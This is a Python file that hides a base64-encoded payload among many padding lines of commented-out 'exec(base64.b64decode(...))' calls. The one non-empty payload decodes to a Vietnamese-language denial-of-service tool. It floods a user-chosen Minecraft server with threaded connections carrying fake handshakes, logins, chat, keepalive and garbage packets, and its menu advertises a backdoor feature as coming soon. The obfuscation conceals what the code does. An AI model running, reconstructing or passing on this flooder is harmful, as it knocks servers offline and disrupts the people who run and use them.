#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('CmltcG9ydCBzb2NrZXQKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzdHJpbmcKaW1wb3J0IG9zCgpjbGFzcyBDb2xvcnM6CiAgICBIRUFERVIgPSAnXDAzM1s5NW0nCiAgICBPS0JMVUUgPSAnXDAzM1s5NG0nCiAgICBPS0dSRUVOID0gJ1wwMzNbOTJtJwogICAgV0FSTklORyA9ICdcMDMzWzkzbScKICAgIEZBSUwgPSAnXDAzM1s5MW0nCiAgICBJTkZPID0gJ1wwMzNbOTZtJwogICAgRU5EQyA9ICdcMDMzWzBtJwogICAgQk9MRCA9ICdcMDMzWzFtJwoKY2xhc3MgSWNvbnM6CiAgICBBUlJPVyA9ICfilronCiAgICBDSEVDSyA9ICfinJQnCiAgICBDUk9TUyA9ICfinJgnCiAgICBTVEFSID0gJ+KYhScKICAgIFdBUk5JTkcgPSAn4pigJwogICAgSU5GTyA9ICfinIknCiAgICBORVhUID0gJ+KepCcKICAgIENIRUNLQk9YID0gJ+KYkScKICAgIEJVTExFVCA9ICfinKYnCgpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykKCnN1Y2Nlc3NfY291bnQgPSAwCmZhaWxfY291bnQgPSAwCmxvY2sgPSB0aHJlYWRpbmcuTG9jaygpCgpkZWYgZW5jb2RlX3ZhcmludCh2YWx1ZSk6CiAgICByZXN1bHQgPSBiJycKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdGVtcCA9IHZhbHVlICYgMHg3RgogICAgICAgIHZhbHVlID4+PSA3CiAgICAgICAgaWYgdmFsdWU6CiAgICAgICAgICAgIHRlbXAgfD0gMHg4MAogICAgICAgIHJlc3VsdCArPSBieXRlcyhbdGVtcF0pCiAgICAgICAgaWYgbm90IHZhbHVlOgogICAgICAgICAgICBicmVhawogICAgcmV0dXJuIHJlc3VsdAoKZGVmIGVuY29kZV9zdHJpbmcocyk6CiAgICBkYXRhID0gcy5lbmNvZGUoJ3V0Zi04JykKICAgIHJldHVybiBlbmNvZGVfdmFyaW50KGxlbihkYXRhKSkgKyBkYXRhCgpkZWYgc2VuZF9wYWNrZXQoc29jaywgcGFja2V0X2lkLCBkYXRhKToKICAgIHBhY2tldCA9IGJ5dGVzKFtwYWNrZXRfaWRdKSArIGRhdGEKICAgIGxlbmd0aCA9IGVuY29kZV92YXJpbnQobGVuKHBhY2tldCkpCiAgICBzb2NrLnNlbmRhbGwobGVuZ3RoICsgcGFja2V0KQoKZGVmIGdlbmVyYXRlX3VzZXJuYW1lKCk6CiAgICByZXR1cm4gIlVzZXJfIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZXMoc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSArIHN0cmluZy5kaWdpdHMsIGs9OCkpCgpkZWYgcmFuZG9tX2NoYXQoKToKICAgIHJldHVybiAnJy5qb2luKHJhbmRvbS5jaG9pY2VzKHN0cmluZy5hc2NpaV9sZXR0ZXJzICsgc3RyaW5nLmRpZ2l0cywgaz1yYW5kb20ucmFuZGludCg1LCAyMCkpKQoKY2xhc3MgTWl4ZWRQYWNrZXRGbG9vZGVyOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGlwLCBwb3J0LCBwYWNrZXRfaWQpOgogICAgICAgIHNlbGYuaXAgPSBpcAogICAgICAgIHNlbGYucG9ydCA9IHBvcnQKICAgICAgICBzZWxmLnBhY2tldF9pZCA9IHBhY2tldF9pZAogICAgICAgIHNlbGYuc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKCiAgICBkZWYgY29ubmVjdChzZWxmKToKICAgICAgICBzZWxmLnNvY2suc2V0dGltZW91dCgzKQogICAgICAgIHNlbGYuc29jay5jb25uZWN0KChzZWxmLmlwLCBzZWxmLnBvcnQpKQoKICAgIGRlZiBydW4oc2VsZik6CiAgICAgICAgZ2xvYmFsIHN1Y2Nlc3NfY291bnQsIGZhaWxfY291bnQKICAgICAgICB0cnk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHNlbGYuY29ubmVjdCgpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH3Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gU0VSVkVSIE3huqRUIEvhur5UIE7hu5BJICggQ0jhur5UICl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdpdGggbG9jazoKICAgICAgICAgICAgICAgICAgICBmYWlsX2NvdW50ICs9IDEKICAgICAgICAgICAgICAgIHJldHVybgoKICAgICAgICAgICAgaGFuZHNoYWtlID0gKAogICAgICAgICAgICAgICAgZW5jb2RlX3ZhcmludCg3NTQpICsKICAgICAgICAgICAgICAgIGVuY29kZV9zdHJpbmcoc2VsZi5pcCkgKwogICAgICAgICAgICAgICAgc2VsZi5wb3J0LnRvX2J5dGVzKDIsICdiaWcnKSArCiAgICAgICAgICAgICAgICBlbmNvZGVfdmFyaW50KDIpICAjIE5leHQgc3RhdGUgPSBsb2dpbgogICAgICAgICAgICApCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgaGFuZHNoYWtlKQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMDIpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgZW5jb2RlX3N0cmluZyhnZW5lcmF0ZV91c2VybmFtZSgpKSkKICAgICAgICAgICAgdGltZS5zbGVlcCgwLjA1KQoKICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UocmFuZG9tLnJhbmRpbnQoMiwgNikpOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3JhbmRvbV9wYWNrZXQoKQoKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgc3VjY2Vzc19jb3VudCArPSAxCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaMOgbmggQ8O0bmcgIXtDb2xvcnMuRU5EQ30iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaOG6pXQgQuG6oWl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgZmFpbF9jb3VudCArPSAxCiAgICAgICAgZmluYWxseToKICAgICAgICAgICAgc2VsZi5zb2NrLmNsb3NlKCkKCiAgICBkZWYgc2VuZF9yYW5kb21fcGFja2V0KHNlbGYpOgogICAgICAgIHBrdF90eXBlID0gcmFuZG9tLmNob2ljZShbImNoYXQiLCAicGx1Z2luIiwgImtlZXBhbGl2ZSIsICJjdXN0b20iXSkKCiAgICAgICAgaWYgcGt0X3R5cGUgPT0gImNoYXQiOgogICAgICAgICAgICBtc2cgPSBlbmNvZGVfc3RyaW5nKHJhbmRvbV9jaGF0KCkpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMywgbXNnKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gInBsdWdpbiI6CiAgICAgICAgICAgIGNoYW5uZWwgPSBlbmNvZGVfc3RyaW5nKCJNQ3xCcmFuZCIpCiAgICAgICAgICAgIGRhdGEgPSBlbmNvZGVfc3RyaW5nKCJMQUMxM19DdXN0b21DbGllbnQiKQogICAgICAgICAgICBzZW5kX3BhY2tldChzZWxmLnNvY2ssIDB4MTcsIGNoYW5uZWwgKyBkYXRhKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gImtlZXBhbGl2ZSI6CiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgyMSwgZW5jb2RlX3ZhcmludChyYW5kb20ucmFuZGludCgxMDAwMCwgOTk5OTk5KSkpCiAgICAgICAgZWxpZiBwa3RfdHlwZSA9PSAiY3VzdG9tIjoKICAgICAgICAgICAgZ2FyYmFnZSA9IGJ5dGVzKHJhbmRvbS5nZXRyYW5kYml0cyg4KSBmb3IgXyBpbiByYW5nZShyYW5kb20ucmFuZGludCgxMCwgMzApKSkKICAgICAgICAgICAgZmFrZV9pZCA9IHJhbmRvbS5yYW5kaW50KDB4MDEsIDB4M0YpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgZmFrZV9pZCwgZ2FyYmFnZSkKCmRlZiBzdGFydF9hdHRhY2soaXAsIHBvcnQsIHBhY2tldHNfcGVyX3JvdW5kLCBkdXJhdGlvbik6CiAgICBzdGFydF90aW1lID0gdGltZS50aW1lKCkKICAgIHBhY2tldF9pZCA9IDEKCiAgICB0cnk6CiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgdGhyZWFkcyA9IFtdCiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKHBhY2tldHNfcGVyX3JvdW5kKToKICAgICAgICAgICAgICAgIHQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1NaXhlZFBhY2tldEZsb29kZXIoaXAsIHBvcnQsIHBhY2tldF9pZCkucnVuKQogICAgICAgICAgICAgICAgdC5zdGFydCgpCiAgICAgICAgICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgICAgICAgICAgcGFja2V0X2lkICs9IDEKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4wMDIpCgogICAgICAgICAgICBmb3IgdCBpbiB0aHJlYWRzOgogICAgICAgICAgICAgICAgdC5qb2luKCkKCiAgICAgICAgICAgIGlmIGR1cmF0aW9uICE9IDAgYW5kIHRpbWUudGltZSgpIC0gc3RhcnRfdGltZSA+PSBkdXJhdGlvbjoKICAgICAgICAgICAgICAgIGJyZWFrCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgcHJpbnQoZiJcbntDb2xvcnMuV0FSTklOR33Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gROG7q25nIGLhu59pIG5nxrDhu51pIGTDuW5nLntDb2xvcnMuRU5EQ30iKQogICAgZmluYWxseToKICAgICAgICBwcmludChmIlxue0NvbG9ycy5IRUFERVJ9yp/htIDhtIThtI3htIDJqsqA4bSA4bSYIOG0m+G0j+G0j8qfIFThuqROIEPDlE5HIEvhur5UIFRIw5pDe0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59VGjDoG5oIGPDtG5nOiB7c3VjY2Vzc19jb3VudH17Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1UaOG6pXQgYuG6oWk6IHtmYWlsX2NvdW50fXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfVThu5VuZyB0aOG7nWkgZ2lhbjoge2ludCh0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUpfSBnacOieXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHdhaXRfZm9yX3JldHVybigpCgpkZWYgd2FpdF9mb3JfcmV0dXJuKCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGlucCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfXtJY29ucy5BUlJPV30gTmjhuq1wIDAgxJHhu4MgcXVheSBs4bqhaSBtZW51OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgIGlmIGlucCA9PSAiMCI6CiAgICAgICAgICAgIGJyZWFrCgpkZWYgY2hlY2tfc2VydmVyKGlwLCBwb3J0KToKICAgIHRyeToKICAgICAgICB0ZXN0X3NvY2sgPSBzb2NrZXQuc29ja2V0KCkKICAgICAgICB0ZXN0X3NvY2suc2V0dGltZW91dCgzKQogICAgICAgIHRlc3Rfc29jay5jb25uZWN0KChpcCwgcG9ydCkpCiAgICAgICAgdGVzdF9zb2NrLmNsb3NlKCkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIHNob3dfbWVudSgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0JMVUV9e0ljb25zLlNUQVIqM30gSMOjeSBHaGkgc+G7kSDEkeG7gyBzw6BpIMqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyB7SWNvbnMuU1RBUiozfXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59e0ljb25zLkNIRUNLfSAxLiBIaeG7h24gU3RhdHVze0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiIgICB7Q29sb3JzLklORk99SGnhu4duIHRow7RuZyB0aW4sIGNo4bupYyBuxINuZyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfXtJY29ucy5DSEVDS0JPWH0gMi4gSGnhu4duIFRvb2xzIMSRYW5nIHPDoGl7Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIiAgIHtDb2xvcnMuSU5GT31IxrDhu5tuZyBk4bqrbiBjw6FjaCBz4butIGThu6VuZyB0b29sIGRvcyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5XQVJOSU5HfXtJY29ucy5XQVJOSU5HfSAzLiBIaeG7h24gVG9vbHMgQmFja2Rvb3IgKENvbWluZyBzb29uKXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfVTDrW5oIG7Eg25nIEJhY2tkb29yIGhp4buHbiBjaMawYSBraOG6oyBk4bulbmcsIHPhur0gY+G6rXAgbmjhuq10IHNhdXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkZBSUx9e0ljb25zLkNST1NTfSA0LiBU4bqlbiBDw7RuZyBJcHtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfUto4bufaSDEkeG7mW5nIGNo4bupYyBuxINuZyB04bqlbiBjw7RuZyBn4butaSBwYWNrZXQgxJHhur9uIElQIHNlcnZlciDEkcOjIG5o4bqtcHtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkhFQURFUn17SWNvbnMuTkVYVH0gMC4gVGhvw6F0e0NvbG9ycy5FTkRDfVxuIikKCiAgICAgICAgY2hvaWNlID0gaW5wdXQoZiJ7Q29sb3JzLkJPTER9e0ljb25zLkFSUk9XfSBDaOG7jW46IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCgogICAgICAgIGlmIGNob2ljZSA9PSAiMSI6CiAgICAgICAgICAgIGNsZWFyX3NjcmVlbigpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBsw6AgY8O0bmcgY+G7pSBn4butaSBwYWNrZXQgaOG7l24gaOG7o3AgTWluZWNyYWZ0IMSR4buDIGtp4buDbSB0cmEga2jhuqMgbsSDbmcgY2jhu4t1IHThuqNpIHNlcnZlci57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLklORk99SOG7lyB0cuG7oyBuaGnhu4F1IGxv4bqhaSBwYWNrZXQgbmjGsCBjaGF0LCBwbHVnaW4sIGtlZXBhbGl2ZSwgY3VzdG9tLCB2LnYue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tHUkVFTn1Ub29scyDEkWFuZyBzw6BpOntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBoYW5kc2hha2UiKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBsb2dpbiBzdGFydCIpCiAgICAgICAgICAgIHByaW50KGYiIC0gR+G7rWkgcGFja2V0IGNoYXQsIHBsdWdpbiwga2VlcGFsaXZlLCBjdXN0b20gbmfhuqt1IG5oacOqbiIpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfULhuqFuIGPDsyB0aOG7gyB0w7l5IGNo4buNbiBz4buRIGzGsOG7o25nIHBhY2tldCBn4butaSB2w6AgdGjhu51pIGdpYW4gdOG6pW4gY8O0bmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjMiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuV0FSTklOR31Uw61uaCBuxINuZyBCYWNrZG9vciDEkWFuZyB0cm9uZyBxdcOhIHRyw6xuaCBwaMOhdCB0cmnhu4NuIHbDoCBjaMawYSBraOG6oyBk4bulbmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjQiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBpcCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBJUCBzZXJ2ZXIgTWluZWNyYWZ0OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwb3J0X3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBQb3J0ICht4bq3YyDEkeG7i25oIDI1NTY1KToge0NvbG9ycy5FTkRDfSIpLnN0cmlwKCkKICAgICAgICAgICAgcG9ydCA9IGludChwb3J0X3N0cikgaWYgcG9ydF9zdHIuaXNkaWdpdCgpIGVsc2UgMjU1NjUKICAgICAgICAgICAgaWYgbm90IGNoZWNrX3NlcnZlcihpcCwgcG9ydCk6CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1LaMO0bmcgdGjhu4Mga+G6v3QgbuG7kWkgdOG7m2kgc2VydmVyIHtpcH06e3BvcnR9LiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaSBJUCBob+G6t2MgUG9ydC57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBwYWNrZXRzX3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfVPhu5EgbMaw4bujbmcgcGFja2V0IGfhu61pIG3hu5dpIGzhuqduICh2ZDogMTApOiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwYWNrZXRzID0gaW50KHBhY2tldHNfc3RyKSBpZiBwYWNrZXRzX3N0ci5pc2RpZ2l0KCkgZWxzZSAxMAogICAgICAgICAgICBkdXJhdGlvbl9zdHIgPSBpbnB1dChmIntDb2xvcnMuQk9MRH1UaOG7nWkgZ2lhbiB04bqlbiBjw7RuZyAoZ2nDonksIG5o4bqtcCAwIMSR4buDIHbDtCBo4bqhbik6IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCiAgICAgICAgICAgIGR1cmF0aW9uID0gaW50KGR1cmF0aW9uX3N0cikgaWYgZHVyYXRpb25fc3RyLmlzZGlnaXQoKSBlbHNlIDAKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLldBUk5JTkd9QuG6r3QgxJHhuqd1IHThuqVuIGPDtG5nIElQIHtpcH06e3BvcnR9Li4ue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHN0YXJ0X2F0dGFjayhpcCwgcG9ydCwgcGFja2V0cywgZHVyYXRpb24pCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjAiOgogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tCTFVFfVRob8OhdCBjaMawxqFuZyB0csOsbmguIEjhurluIGfhurdwIGzhuqFpIXtDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBicmVhawogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfUzhu7FhIGNo4buNbiBraMO0bmcgaOG7o3AgbOG7hy4gVnVpIGzDsm5nIHRo4butIGzhuqFpLntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDEpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgc2hvd19tZW51KCkK').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#(base64.b64decode('').decode('utf-8'))
